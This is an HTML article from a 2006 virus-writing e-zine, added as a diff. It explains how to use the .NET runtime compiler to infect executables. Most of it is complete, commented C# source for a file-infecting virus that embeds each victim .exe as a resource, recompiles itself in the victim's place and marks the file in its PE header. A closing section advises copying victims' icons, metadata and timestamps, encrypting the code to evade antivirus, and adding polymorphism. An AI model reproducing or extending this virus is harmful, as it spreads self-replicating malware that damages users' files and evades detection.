@@ -1,0 +1,335 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: DiA/rRlf || <a style="text-decoration: none" href="../mainmenu/articles.htm"><span style="text-decoration: none">Back to articles</span></a> ||<hr></pre>
+<pre>
+  ______________________________________________________________
+ |                                                              |
+ | Using the .NET runtime compiler for file infection           |#
+ | &raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;           |#
+ |                                                              |#
+ | by DiA/RRLF (c)2006                                          |#
+ | www.vx-dia.de.vu :: DiA_hates_machine@gmx.de                 |#
+ |______________________________________________________________|#
+   ###############################################################
+
+
+
+  _Overview___________________________________
+ |                                            |
+ | 1_Intro                                    |#
+ | 2_The main idea                            |#
+ | 3_My ideas, and what not worked            |#
+ | 4_How it can work                          |#
+ | 5_Working source code                      |#
+ | 6_Make it strong, further ideas            |#
+ | 7_Outro                                    |#
+ |____________________________________________|#
+   #############################################
+
+
+
+ .Disclaimer
+  &raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;
+    The author of this article is  NOT responsible for possible damages in case
+   of informations you getting here. You do your  own things at  your own risk,
+   please don't do anything stupid for  your own security. This document is for
+   educational  purpose only.  If you do  NOT agree this, please close this for
+   your own pleasure!
+
+
+ .1_Intro
+  &raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;
+    Hello and welcome to my second article on .NET and C#. Again I got bored of
+   programming in C++. So, this is again a sidestep in the easy and simple world
+   of .NET programming. In this tutorial I describe how to infect executables by
+   using the .NET runtime compiler. Also I provide a workin source code with comments
+   and ideas/hints how to make a real virus with this technique.
+
+
+ .2_The main idea
+  &raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;
+    When I played with the runtime compiler, I also checked out all the compiler
+   options and parameters. Resource files (any kind, .jpg, .doc, .xxx) can be
+   compiled within the source. And .NET provides a ResourceManager, wich makes
+   reading resources in .NET files very easy. So the main idea is to compile the
+   virus every time new when a victim was found, and the victim will be added as
+   resource. Then on runtime, extract resource and run the host file. To act like
+   this, the virus must have its own source, to compile. Since .NET executables
+   (not abused) is like open source (use Reflector) we just don't really care.
+
+
+ .3_My ideas, and what not worked
+  &raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;
+    I got good ideas before I started coding this example virus, but it turned out
+   that much don't work very well:
+
+   Source as String - I wanted to store the source code of the virus as string in the
+                      virus body. It was much much work, and not really worth it. You
+                      have to care that your source is compiled right (care for &quot; as
+                      example), string max length (in source) is 2046 bytes.
+
+   Load host in memory - You can load a .NET assembly (a .exe for example), and invoke
+                         (execute) it in your current running application. This would
+                         be nice, cause you dont have to drop host on disk and run it.
+                         But it turned out that this technique is just fine for stand-
+                         alone application. Try to execute a application linked to
+                         .dll's or other needed files will cause problems or errors.
+                         Anyway, here is the source I tried, host file is in a byte
+                         array:
+
+                         //...
+                         Assembly HostAsm = Assembly.Load(HostArray); //byte array, .exe
+                         MethodInfo HostMethod = HostAsm.EntryPoint; //main
+                         HostMethod.Invoke(HostAsm.CreateInstance(HostMethod.Name), null); //execute
+                         //...
+
+   Check for infection - To not re-infect files, we have to check for infection. Good,
+                         as .NET have a ResourceManager, and the already infected files
+                         must have a resource named like we want it. Try to read a byte,
+                         if no error occours the file seems to be infected, error means
+                         no resource named like we have, means not infected. But somehow
+                         I can't close the resource stream when the host resource doesn't
+                         exist. And if the stream is still open, we can't delete the victim
+                         file (nor recompile it). It's mystic that .NET allow to open a
+                         not existing stream, but it's not able to close this stream.
+                         Anyway, improve!
+
+
+ .4_How it can work
+  &raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;
+    So, much don't work as I wanted, improve is the keyword. And improve means going
+   simple, and use already known techniques. This is how the example virus works:
+   The virus source is also in the binary as resource, and will be read and drop to
+   disc when needed. But first the host is read from the resource stream, dropped to
+   disc, and executed. After termination the temporary host will be deleted. Here goes
+   the infection (source code is already on disc). The virus find all .exe files in
+   current directory, copy that file to &lt;filename&gt;.res, delete original victim, and
+   compile the virus source (in same directory) to the .exe name of the victim. On
+   compiling it add's the host binary and the virus source as resource. After compilation
+   the virus writes it's infection marker in the PE header. If something
+   goes wrong the temp resource file is copied back, to leave host uninfected. Before
+   infecting the virus also checks if the found .exe is a .NET application and if the
+   victim is already infected, by checking 4 bytes in the PE header (WIN32_VERSION).
+   For more details please check the source code in the next section, there are also
+   comments for helping you to understand what I mean.
+
+
+ .5_Working source code
+  &raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;
+using System;
+using System.IO;
+using System.Reflection;
+using System.CodeDom.Compiler;
+using Microsoft.CSharp;
+using System.Resources;
+using System.Diagnostics;
+using System.Windows.Forms; //namespaces we use in this virus
+
+namespace Biskin //our namespace
+{
+	class DiA //we use just this one class, simple virus
+	{
+		static void Main(string[] args) //our entry point
+		{
+			byte[] Marker = {0x42, 0x53, 0x4B, 0x69}; //&quot;BSKi&quot;, our infection marker to prevent re-infection
+
+			string SourceName = &quot;&quot;; //here we store the extracted source code, we define it here because we handle it in more try/catch then one
+			Random RanNumber = new Random(DateTime.Now.Millisecond); //to generate random number, user current millisecond as seed
+			Assembly ThisAsm = Assembly.GetExecutingAssembly(); //the own assembly, to extract the resources (host &amp; source)
+			
+			try //we use some try/catch blocks in this virus, error handling in c# is nice
+			{
+				Stream ResStream = ThisAsm.GetManifestResourceStream(&quot;host.bin&quot;); //get the stream for the resource &quot;host.bin&quot;
+								
+				string HostName = RanNumber.Next(99999).ToString() + &quot;.scr&quot;; //generate a temporary host name, just andom number and .scr extension
+				FileStream HostTemp = new FileStream(HostName, FileMode.CreateNew, FileAccess.Write); //filestream to write from resource to file
+
+				for(int i = 0; i &lt; ResStream.Length; i++) //write byte by byte until we reach end of file
+				{
+					HostTemp.WriteByte(Convert.ToByte(ResStream.ReadByte())); //read byte from stream and write it to file
+				}
+
+				HostTemp.Close(); //close file stream
+				ResStream.Close(); //close resource stream
+				File.SetAttributes(HostName, FileAttributes.Hidden); //set the temp host to hidden
+
+				string HostParameters = &quot; &quot;; //to store host's parameter, drag and drop or called via command line
+				
+				for(int i = 0; i &lt; args.Length; i++) //for each argument (parameter) given to the virus
+				{
+					HostParameters += args[i] + &quot; &quot;; //append it to string and put a space between
+				}
+
+				Process.Start(HostName + HostParameters).WaitForExit(); //start temporary host and wait for it's termination
+				File.Delete(HostName); //after termination, delete the temporary host
+			}
+			catch //error on reading resource or write/run temp host
+			{
+				MessageBox.Show(&quot;Can't execute application&quot;, &quot;Error&quot;, MessageBoxButtons.OK, MessageBoxIcon.Error); //show fake error then
+			}
+
+			try //try to extract source code
+			{
+				Stream SrcStream = ThisAsm.GetManifestResourceStream(&quot;biskin.src&quot;); //get stream to resource
+				SourceName = RanNumber.Next(99999).ToString() + &quot;.cs&quot;; //create temporary source file name, random number
+
+				FileStream SourceTemp = new FileStream(SourceName, FileMode.CreateNew, FileAccess.Write); //open filestream for write source to disk
+
+				for(int i = 0; i &lt; SrcStream.Length; i++) //write byte by byte
+				{
+					SourceTemp.WriteByte(Convert.ToByte(SrcStream.ReadByte())); //read byte from resource and write it to file
+				}
+
+				SourceTemp.Close(); //close file stream
+				SrcStream.Close(); //close resource stream
+			}
+			catch //error on reading/writing source code
+			{
+				Application.Exit(); //no source, no infection is possible, exit virus
+			}
+
+			string[] Files = Directory.GetFiles(Directory.GetCurrentDirectory(), &quot;*.exe&quot;); //get all .exe files in current directory
+
+			foreach(string Victim in Files) //for loop all files in the array
+			{
+				try{AssemblyName.GetAssemblyName(Victim);} //easy way to check if founded file is a .NET
+				catch{continue;} //if no .NET executable, try next file
+
+				byte[] IsMarker = new byte[4]; //array where we read the marker
+				FileStream VictimFile = new FileStream(Victim, FileMode.Open, FileAccess.Read); //open potential vicitm for read
+
+				for(int i = 0; i &lt; 136; i++) //skip first bytes
+				{
+					VictimFile.ReadByte(); //by reading bytes to nothing
+				}
+
+				VictimFile.Read(IsMarker, 0, Marker.Length); //read now 4 bytes to array
+				VictimFile.Close(); //and close file stream
+
+				//check if readed bytes are our infection marker, if so try next file
+				if(IsMarker[0] == Marker[0] &amp;&amp; IsMarker[1] == Marker[1] &amp;&amp; IsMarker[2] == Marker[2] &amp;&amp; IsMarker[3] == Marker[3]) continue;
+
+				string ResourceFile = Victim.Remove(Victim.Length - 3, 3) + &quot;res&quot;; //create temp file name for the host resource
+
+				File.Copy(Victim, ResourceFile); //copy uninfected host to temporary file
+				File.SetAttributes(ResourceFile, FileAttributes.Hidden); //and set it to hidden
+
+				try{File.Delete(Victim);} //try to delete the victim
+				catch
+				{
+					File.Delete(ResourceFile); //if it still run, delete temp resource file
+					continue; //and leave it uninfected
+				}
+
+				try //action! try to compile virus source with source and host binary as resource
+				{
+					ICodeCompiler Compiler = new CSharpCodeProvider().CreateCompiler(); //create compiler
+					CompilerParameters Parameter = new CompilerParameters(); //and it's parameters
+
+					Parameter.GenerateExecutable = true; //we want to create a exe, sure
+					Parameter.MainClass = &quot;Biskin.DiA&quot;; //the main class, we are now in it
+					Parameter.OutputAssembly = Victim; //compile output, the victim name (we deleted it already)
+					//some raw compiler commands, optimize output, make windows application (no command prompt shit)
+					//and add via &quot;/resource&quot; the host binary (we copy it before) and the virus source (we extracted it before)
+					Parameter.CompilerOptions = &quot;/optimize /target:winexe /resource:&quot; + ResourceFile + &quot;,host.bin /resource:&quot; + SourceName + &quot;,biskin.src&quot;;
+
+					foreach(Assembly Asm in AppDomain.CurrentDomain.GetAssemblies()) //lazy style
+					{
+						Parameter.ReferencedAssemblies.Add(Asm.Location); //just reference all assemblies we found, so we are sure our virus has all to compile
+					}
+
+					if(Compiler.CompileAssemblyFromFile(Parameter, SourceName).Errors.Count == 0) //compile! and check if no compile errors
+					{
+						VictimFile = new FileStream(Victim, FileMode.Open, FileAccess.ReadWrite); //open the freshly compiled executable
+
+						for(int i = 0; i &lt; 136; i++) //skip first bytes
+						{
+							VictimFile.ReadByte(); //by read bytes to nothing
+						}
+
+						VictimFile.Write(Marker, 0, Marker.Length); //then write our infection marker to WIN32_VERSION in the PE header (unused space)
+						VictimFile.Close(); //close file stream
+					}
+					else //argh, compiler error
+					{
+						File.Copy(ResourceFile, Victim); //copy resource file back to real name, and leave it uninfected
+					}
+
+					File.Delete(ResourceFile); //delete reosurce file and handle next file
+				}
+				catch{} //any error is redirected here, just do nothing
+			}
+
+			try{File.Delete(SourceName);} //try to delete source file, should work
+			catch{File.SetAttributes(SourceName, FileAttributes.Hidden);} //if it's still in use just set it to hidden
+		}
+	}
+} //done.
+
+
+ .6_Make it strong, further ideas
+  &raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;
+    Sure, the provided source code is just a proof of concept, and not done to stay in
+   the wild or anything like that. Here are some add's you have to make if you want make
+   this virus (or your virus) a good one:
+
+   Where is my icon?
+    The icon of the compiled virus (within host) is the default windows application icon,
+    cause we didn't give the compiler any icon. To prevent this, just extract the icon from
+    the potential victim (google hint: Code Corner - Tools - Icon Browser), and give it
+    as compiler parameter &quot;/win32icon:filename&quot;. After that delete the extracted icon.
+    And all is fine.
+
+   And where are my file properties?
+    Also the compiled file don't have any properties, such as Name, Copyright, Trademark,
+    etc. This is also very simple issue, properties of the file can be read like this:
+
+    //...
+    foreach(object Attribute in Assembly.LoadFrom(&quot;Victim.exe&quot;).GetCustomAttributes(false)) //check all attributes
+    {
+        AssemblyCopyrightAttribute Copyleft = Attribute as AssemblyCopyrightAttribute; //as copyright attribute, as example
+	
+        if(Copyleft != null) //found copyright attribute?
+        {
+		string OldCopyright = Copyleft.Copyright; //the copyright to string
+	}
+    } //others can be read in the same way
+    //...
+
+    Then write in the virus source (after used namespaces, before own namespace) this
+    (don't foget namespaces System.Reflection and System.Runtime.CompilerServices):
+
+    //...
+    [assembly: AssemblyCopyright(OldCopyright)]
+    //...
+
+    Other assembly informations are AssemblyTitle, AssemblyDescription,
+    AssemblyConfiguration, AssemblyCompany, AssemblyProduct, AssemblyTrademark,
+    AssemblyCulture.
+
+   Filetime?
+    Also take care for filetime, read filetime of potential victim and set it after
+    compilation again. Easy, huh?
+
+   Detected in &lt; 1min?
+    This is not a hard take for AV people, cause the plain source is stored. So a good
+    idea is to encrypt the source code resource. Maybe also with a changing key. .NET
+    provides also encryption classes like DES or even TripleDES. Also you can encrypt the
+    host resource, so it can't be easiely cut out of the virus and be restored.
+
+   More More More!
+    Now it's on you, imagin you are at source level, so polymorphism is not a hard take,
+    also adding garbage is a good idea. Encrypt strings, split source to 100s classes, etc
+    etc. Use your brain.
+
+
+ .7_Outro
+  &raquo;&raquo;&raquo;&raquo;&raquo;&raquo;&raquo;
+    Hope you liked this article and the idea how to use the .NET runtime compiler for file
+   infection. If you do anything in this way, let me know, DiA_hates_machine@gmx.de.
+   Next time friends, bye.
+
+                                                                     DiA/RRLF - 23.08.2006
+</pre></body></html>
